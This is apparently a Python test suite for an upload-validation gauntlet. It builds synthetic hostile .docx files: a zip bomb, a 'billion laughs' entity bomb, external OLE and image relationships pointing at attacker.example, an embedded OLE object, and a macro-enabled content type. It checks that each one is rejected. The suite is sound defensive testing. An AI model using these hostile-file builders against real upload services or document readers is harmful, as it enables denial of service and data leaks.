#!/usr/bin/env python3
"""
Executable tests for issue #63: hostile-file upload validation + AV scan +
hardened OOXML parsing.

Exercises the real enforcement code in backend/src/upload_validation.py
against synthetically constructed `.docx`-shaped byte strings (no live AWS,
no external AV binary — follows the same third-party-stubbing convention as
tests/test_download_auth_attack.py and tests/test_review_submission_e2e.py
so the suite runs in CI without extra installs).

Per issue #63 AC: "Unit tests cover each hostile-file class (oversized, zip
bomb, entity bomb, external-relationship, embedded-object, macro template,
MIME mismatch)."

The gauntlet order matches docs/threat-model.md -> Hostile file uploads:
  1. Size cap (request size + decompressed-size / zip-bomb ratio)
  2. MIME / magic-number verification (+ [Content_Types].xml WordprocessingML)
  3. AV scan (in-account ClamAV interface — mocked here)
  4. XML-entity hardening (DTD / external-entity rejection)
  5. External-relationship + embedded-object + macro-template checks

A failed validation raises the module's HostileFileError (mapped to
HTTPException by the caller) and never reaches the pipeline; each rejection
path also writes an audit row via the injected audit-write callable.

Exit codes: 0 = all tests pass, 1 = one or more tests failed.
"""

import io
import struct
import sys
import types
import unittest
import zipfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
BACKEND_SRC = REPO_ROOT / "backend" / "src"

if str(BACKEND_SRC) not in sys.path:
    sys.path.insert(0, str(BACKEND_SRC))


def _stub_third_party() -> None:
    """Inject minimal stubs for fastapi if absent (repo convention)."""
    if "fastapi" not in sys.modules:
        fastapi_mod = types.ModuleType("fastapi")

        class HTTPException(Exception):
            def __init__(self, status_code: int, detail: str = "") -> None:
                self.status_code = status_code
                self.detail = detail
                super().__init__(detail)

        class status:  # noqa: N801
            HTTP_400_BAD_REQUEST = 400
            HTTP_422_UNPROCESSABLE_ENTITY = 422
            HTTP_413_REQUEST_ENTITY_TOO_LARGE = 413
            HTTP_503_SERVICE_UNAVAILABLE = 503

        fastapi_mod.HTTPException = HTTPException
        fastapi_mod.status = status
        sys.modules["fastapi"] = fastapi_mod


_stub_third_party()

import upload_validation as uv  # noqa: E402

HTTPException = sys.modules["fastapi"].HTTPException


# ---------------------------------------------------------------------------
# Helpers to build synthetic OOXML .docx-shaped archives
# ---------------------------------------------------------------------------

CONTENT_TYPES_WORDPROCESSINGML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Override PartName="/word/document.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.'
    'wordprocessingml.document.main+xml"/>'
    "</Types>"
)

DOCUMENT_XML_MINIMAL = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    "<w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body>"
    "</w:document>"
)

RELS_XML_BENIGN = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
    'Target="word/document.xml"/>'
    "</Relationships>"
)


def _build_valid_docx() -> bytes:
    """A minimal, well-formed, benign .docx used as the control/happy path."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
    return buf.getvalue()


def _build_docx_with_extra_entries(entry_count: int, entry_body: bytes = b"x") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        for i in range(entry_count):
            zf.writestr(f"word/junk{i}.bin", entry_body)
    return buf.getvalue()


def _build_zip_bomb_docx() -> bytes:
    """A single entry whose compressed size is tiny relative to its
    uncompressed size — a classic zip-bomb compression-ratio attack."""
    buf = io.BytesIO()
    huge_payload = b"0" * (200 * 1024 * 1024)  # 200MB of a single repeated byte
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/bomb.bin", huge_payload)
    return buf.getvalue()


def _build_docx_with_entity_bomb() -> bytes:
    """word/document.xml carries a DOCTYPE with an entity expansion (a
    scaled-down 'billion laughs' pattern) — must be rejected by the
    XML-entity hardening check without ever being expanded."""
    entity_bomb_xml = (
        '<?xml version="1.0"?>'
        "<!DOCTYPE lolz [//nolint\n"
        '  <!ENTITY lol "lol">\n'
        '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
        '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
        "]>"
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        "<w:body><w:p><w:r><w:t>&lol3;</w:t></w:r></w:p></w:body>"
        "</w:document>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", entity_bomb_xml)
    return buf.getvalue()


def _build_docx_with_external_relationship() -> bytes:
    """word/_rels/document.xml.rels declares a TargetMode="External"
    relationship to a remote URL — must be rejected."""
    external_rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
        'Target="http://attacker.example/payload.bin" TargetMode="External"/>'
        "</Relationships>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", external_rels_xml)
    return buf.getvalue()


def _build_docx_with_external_hyperlink() -> bytes:
    """word/_rels/document.xml.rels declares a TargetMode="External"
    relationship of type hyperlink — the benign, ubiquitous case. A hyperlink
    is inert until a human clicks it and never fetches at parse/open time, so
    it must be accepted (see docs/threat-model.md)."""
    hyperlink_rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
        'Target="https://example.com/location/contact" TargetMode="External"/>'
        "</Relationships>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", hyperlink_rels_xml)
    return buf.getvalue()


def _build_docx_with_external_image() -> bytes:
    """word/_rels/document.xml.rels declares a TargetMode="External"
    relationship of type image — Word fetches this the moment the file is
    opened (SSRF / NTLM-hash leak), so it must stay rejected even though it is
    not a hyperlink."""
    image_rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
        'Target="http://attacker.example/beacon.png" TargetMode="External"/>'
        "</Relationships>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", image_rels_xml)
    return buf.getvalue()


def _build_docx_with_embedded_object() -> bytes:
    """A package relationship of type oleObject pointing at an internal
    embedded OLE package — must be rejected."""
    embed_rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
        'Target="embeddings/oleObject1.bin"/>'
        "</Relationships>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/_rels/document.xml.rels", embed_rels_xml)
        zf.writestr("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0fake-ole")
    return buf.getvalue()


def _build_macro_enabled_docx() -> bytes:
    """[Content_Types].xml declares the macro-enabled main document content
    type (the .docm main-document type) and a vbaProject.bin part is
    present — must be rejected even though the filename says .docx."""
    macro_content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
        '<Override PartName="/word/vbaProject.bin" '
        'ContentType="application/vnd.ms-office.vbaProject"/>'
        "</Types>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", macro_content_types)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/vbaProject.bin", b"macro-bytes")
    return buf.getvalue()


def _build_mime_mismatch_file() -> bytes:
    """Not a ZIP at all — a renamed PDF-ish payload with a .docx extension
    (MIME/magic-number mismatch)."""
    return b"%PDF-1.4\n%renamed payload pretending to be a .docx\n"


def _build_docx_with_bad_content_types() -> bytes:
    """A real, well-formed ZIP/OOXML container but [Content_Types].xml does
    NOT declare a WordprocessingML main document (e.g. a spreadsheet) —
    magic number says ZIP, but the declared part types are wrong."""
    spreadsheet_content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Override PartName="/xl/workbook.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.'
        'spreadsheetml.sheet.main+xml"/>'
        "</Types>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", spreadsheet_content_types)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("xl/workbook.xml", "<workbook/>")
    return buf.getvalue()


class _FakeAuditSink:
    """Records audit rows written by the gauntlet (issue #63 AC: "A failed
    validation ... writes an audit row")."""

    def __init__(self) -> None:
        self.rows: list[dict] = []

    def __call__(self, **kwargs) -> None:
        self.rows.append(kwargs)


class _FakeAvClient:
    """Injected AV-scan client. `verdict` controls CLEAN/INFECTED; records
    that it was called with the raw bytes before any structural read."""

    def __init__(self, verdict: str = "CLEAN") -> None:
        self.verdict = verdict
        self.scanned_payloads: list[bytes] = []

    def scan(self, file_bytes: bytes) -> str:
        self.scanned_payloads.append(file_bytes)
        return self.verdict


# ---------------------------------------------------------------------------
# 1. Oversized document
# ---------------------------------------------------------------------------


class TestOversizedRequest(unittest.TestCase):
    def test_oversized_upload_rejected_before_any_parsing(self) -> None:
        oversized = b"PK\x03\x04" + b"0" * (uv.MAX_UPLOAD_SIZE_BYTES + 1)
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                oversized,
                filename="big.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-1",
            )
        self.assertEqual(ctx.exception.reason_code, "file_too_large")
        self.assertEqual(len(av.scanned_payloads), 0, "AV scan must not run on an oversized file")
        self.assertEqual(len(audit.rows), 1)
        self.assertEqual(audit.rows[0]["reason_code"], "file_too_large")


# ---------------------------------------------------------------------------
# 2. Zip bomb (entry count + compression ratio / decompressed-size cap)
# ---------------------------------------------------------------------------


class TestZipBomb(unittest.TestCase):
    def test_excess_entry_count_rejected(self) -> None:
        payload = _build_docx_with_extra_entries(uv.MAX_ZIP_ENTRY_COUNT + 10)
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="many-entries.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-2",
            )
        self.assertEqual(ctx.exception.reason_code, "zip_bomb_entry_count")
        self.assertEqual(audit.rows[0]["reason_code"], "zip_bomb_entry_count")

    def test_compression_ratio_bomb_rejected(self) -> None:
        payload = _build_zip_bomb_docx()
        # sanity: the compressed payload on disk must be far smaller than
        # the uncompressed content it claims to hold, or the test proves
        # nothing about ratio detection.
        self.assertLess(len(payload), 5 * 1024 * 1024)
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="bomb.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-3",
            )
        self.assertIn(
            ctx.exception.reason_code,
            {"zip_bomb_ratio", "zip_bomb_uncompressed_size"},
        )
        self.assertEqual(len(av.scanned_payloads), 1, "AV scan runs on raw bytes before structural checks")


# ---------------------------------------------------------------------------
# 3. MIME / magic-number mismatch
# ---------------------------------------------------------------------------


class TestMimeMismatch(unittest.TestCase):
    def test_non_zip_payload_rejected(self) -> None:
        payload = _build_mime_mismatch_file()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="fake.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-4",
            )
        self.assertEqual(ctx.exception.reason_code, "mime_magic_number_mismatch")

    def test_non_wordprocessingml_content_types_rejected(self) -> None:
        payload = _build_docx_with_bad_content_types()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="fake-spreadsheet.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-5",
            )
        self.assertEqual(ctx.exception.reason_code, "mime_magic_number_mismatch")


# ---------------------------------------------------------------------------
# 4. AV scan fails closed
# ---------------------------------------------------------------------------


class TestAvScan(unittest.TestCase):
    def test_infected_file_fails_closed_and_never_reaches_parser(self) -> None:
        payload = _build_valid_docx()
        av = _FakeAvClient(verdict="INFECTED")
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="infected.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-6",
            )
        self.assertEqual(ctx.exception.reason_code, "av_positive")
        self.assertEqual(len(av.scanned_payloads), 1)
        self.assertEqual(audit.rows[0]["reason_code"], "av_positive")

    def test_av_scan_runs_before_xml_parsing(self) -> None:
        """An entity-bomb file that is ALSO flagged INFECTED must fail on
        av_positive, proving AV runs before the parser ever touches the
        archive's XML structure."""
        payload = _build_docx_with_entity_bomb()
        av = _FakeAvClient(verdict="INFECTED")
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="infected-and-hostile.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-7",
            )
        self.assertEqual(ctx.exception.reason_code, "av_positive")

    def test_av_scan_runs_before_mime_content_types_check(self) -> None:
        """A file with a non-WordprocessingML [Content_Types].xml that is ALSO
        flagged INFECTED must fail on av_positive, not mime_magic_number_mismatch —
        proving AV scans the raw bytes before the MIME check ever decompresses
        [Content_Types].xml. Without this test, reordering the MIME check back
        before the AV scan does not fail any test (caught by review mutation
        testing on PR #169)."""
        payload = _build_docx_with_bad_content_types()
        av = _FakeAvClient(verdict="INFECTED")
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="infected-spreadsheet.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-8",
            )
        self.assertEqual(ctx.exception.reason_code, "av_positive")
        self.assertEqual(len(av.scanned_payloads), 1)


# ---------------------------------------------------------------------------
# 5. XML entity expansion (XXE / billion laughs)
# ---------------------------------------------------------------------------


class TestEntityExpansion(unittest.TestCase):
    def test_entity_bomb_rejected_without_expansion(self) -> None:
        payload = _build_docx_with_entity_bomb()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="entity-bomb.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-8",
            )
        self.assertEqual(ctx.exception.reason_code, "xml_entity_rejected")
        self.assertEqual(audit.rows[0]["reason_code"], "xml_entity_rejected")


# ---------------------------------------------------------------------------
# 6. External relationship
# ---------------------------------------------------------------------------


class TestExternalRelationship(unittest.TestCase):
    def test_external_relationship_rejected(self) -> None:
        payload = _build_docx_with_external_relationship()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="external-rel.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-9",
            )
        self.assertEqual(ctx.exception.reason_code, "external_relationship")

    def test_external_image_still_rejected(self) -> None:
        """A non-hyperlink external relationship (image) fetches on open and
        must remain rejected — the hyperlink allowance is a narrow allowlist,
        not a blanket relaxation of external targets."""
        payload = _build_docx_with_external_image()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="external-image.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-9b",
            )
        self.assertEqual(ctx.exception.reason_code, "external_relationship")

    def test_external_hyperlink_accepted(self) -> None:
        """A plain external hyperlink is the benign, ubiquitous case (any
        contract with a clickable URL). It is inert until clicked and never
        fetches at parse time, so the gauntlet must accept it."""
        payload = _build_docx_with_external_hyperlink()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="hyperlink.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-9c",
        )
        self.assertEqual(result, payload)


# ---------------------------------------------------------------------------
# 7. Embedded object
# ---------------------------------------------------------------------------


class TestEmbeddedObject(unittest.TestCase):
    def test_embedded_ole_object_rejected(self) -> None:
        payload = _build_docx_with_embedded_object()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="embedded-object.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-10",
            )
        self.assertEqual(ctx.exception.reason_code, "embedded_object")


# ---------------------------------------------------------------------------
# 8. Macro-enabled template
# ---------------------------------------------------------------------------


class TestMacroEnabledTemplate(unittest.TestCase):
    def test_macro_enabled_content_type_rejected(self) -> None:
        payload = _build_macro_enabled_docx()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="macro.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-11",
            )
        self.assertEqual(ctx.exception.reason_code, "macro_enabled_template")


# ---------------------------------------------------------------------------
# 9. Happy path — a clean, benign .docx passes every gate
# ---------------------------------------------------------------------------


class TestHappyPath(unittest.TestCase):
    def test_valid_benign_docx_passes_and_is_not_audited_as_failure(self) -> None:
        payload = _build_valid_docx()
        av = _FakeAvClient(verdict="CLEAN")
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="clean.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-12",
        )
        self.assertEqual(result, payload)
        self.assertEqual(len(av.scanned_payloads), 1)
        # No failure audit row was written on the success path (the caller
        # is responsible for the normal submission audit trail).
        self.assertEqual(audit.rows, [])


# ---------------------------------------------------------------------------
# 10. Failed validation never reaches the pipeline (HTTPException mapping)
# ---------------------------------------------------------------------------


class TestHttpMapping(unittest.TestCase):
    def test_hostile_file_error_maps_to_client_error_and_blocks_pipeline_handoff(self) -> None:
        payload = _build_mime_mismatch_file()
        av = _FakeAvClient()
        audit = _FakeAuditSink()

        called_pipeline_handoff = {"called": False}

        def fake_handoff(_bytes: bytes) -> None:
            called_pipeline_handoff["called"] = True

        with self.assertRaises(HTTPException) as ctx:
            try:
                validated = uv.run_upload_gauntlet(
                    payload,
                    filename="fake.docx",
                    declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                    av_client=av,
                    audit_write=audit,
                    review_id="rev-13",
                )
                fake_handoff(validated)
            except uv.HostileFileError as exc:
                raise uv.to_http_exception(exc) from exc

        self.assertEqual(ctx.exception.status_code, 400)
        self.assertFalse(
            called_pipeline_handoff["called"],
            "A file that fails validation must never be handed to the pipeline.",
        )


def _run_suite() -> bool:
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    for test_case in (
        TestOversizedRequest,
        TestZipBomb,
        TestMimeMismatch,
        TestAvScan,
        TestEntityExpansion,
        TestExternalRelationship,
        TestEmbeddedObject,
        TestMacroEnabledTemplate,
        TestHappyPath,
        TestHttpMapping,
    ):
        suite.addTests(loader.loadTestsFromTestCase(test_case))
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    return result.wasSuccessful()


if __name__ == "__main__":
    ok = _run_suite()
    sys.exit(0 if ok else 1)
